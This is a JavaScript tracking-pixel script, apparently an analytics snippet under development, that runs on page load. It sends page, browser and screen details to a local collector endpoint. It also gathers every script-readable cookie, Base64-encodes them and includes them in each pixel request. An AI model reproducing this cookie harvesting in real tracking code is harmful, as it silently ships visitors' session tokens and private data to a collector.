(function (window, document) {
    // Define the tracking pixel function
    window.trpx = window.trpx || function () {
        trpx.process ? trpx.process.apply(trpx, arguments) : trpx.queue.push(arguments);
    };
    trpx.queue = trpx.queue || [];

    (function () {
        try {
            const scripts = document.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {
                const script = scripts[i];
                if (script.src && script.src.includes('v1')) {
                    const params = new URL(script.src).searchParams;

                    // Extract script parameters from URL
                    trpx.cc = params.get('cc') || "";
                    trpx.initialEvent = params.get('event') || "pageload";

                    // Extract custom keys starting with 'cmd_'
                    trpx.customParams = {};
                    params.forEach((value, key) => {
                        if (key.startsWith('cmd_')) {
                            trpx.customParams[key] = value;
                        }
                    });

                    break;
                }
            }
        } catch (error) {}
    })();

    trpx.process = function (command, data) {
        try {
            if (command === "event") {
                trpx.fetch(data || {});
            }
        } catch (error) {}
    };

    function getCookies() {
        const cookies = document.cookie.split('; ');
        const cookieObj = {};
        cookies.forEach(cookie => {
            const [name, value] = cookie.split('=');
            cookieObj[name] = decodeURIComponent(value);
        });
        return cookieObj;
    }

    function encodeBase64(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    // Fetch and send a tracking event as a 1x1 pixel request
    trpx.fetch = function (data) {
        try {
            const cookies = getCookies();
            const params = {
                cc: trpx.cc,
                ev: data.event || trpx.initialEvent,
                ed: data.eventData ? JSON.stringify(data.eventData) : "",
                ts: Date.now(),
                v: '1',
                dl: window.location.href,
                rl: document.referrer,
                de: document.characterSet,
                sr: `${screen.width}x${screen.height}`,
                vp: `${window.innerWidth}x${window.innerHeight}`,
                cd: screen.colorDepth,
                dt: document.title,
                md: /Mobi|Android/i.test(navigator.userAgent),
                ua: navigator.userAgent,
                tz: new Date().getTimezoneOffset(),
                ck: encodeBase64(JSON.stringify(cookies)), // Capture all cookies and encode in Base64
            };

            // Add custom extracted params
            Object.assign(params, trpx.customParams);

            const query = Object.keys(params)
                .map(key => `${key}=${encodeURIComponent(params[key])}`)
                .join("&");

            const img = new Image();
            img.src = `http://localhost:2000/pixel?${query}`;
        } catch (error) {}
    };

    // Process queued commands if any
    try {
        while (trpx.queue.length) {
            const args = trpx.queue.shift();
            trpx.process.apply(null, args);
        }
        if (trpx.initialEvent) {
            trpx.process("event", { event: trpx.initialEvent });
        }
    } catch (error) {}
})(window, document);
